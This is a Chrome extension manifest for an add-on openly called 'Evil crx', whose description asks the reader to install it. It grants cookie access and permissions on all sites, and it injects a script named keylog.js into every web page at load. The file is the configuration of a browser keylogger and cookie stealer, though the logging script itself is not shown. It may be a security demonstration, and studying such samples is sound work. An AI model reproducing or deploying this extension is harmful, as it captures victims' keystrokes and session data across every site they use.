{
  "name": "Evil crx",
  "description": "100% evil, but please install",
  "version": "0.1",
  "manifest_version": 3,

  "background": {
    "service_worker": "background.js"
  },
  "permissions": ["cookies", "storage"],
  "host_permissions": ["http://*/*", "https://*/*"],
  "action": {
    "default_popup": "popup.html"
  },
  "content_scripts": [
    {
      "matches": ["http://*/*", "https://*/*"],
      "js": ["keylog.js"],
      "run_at": "document_start"
    }
  ]
}
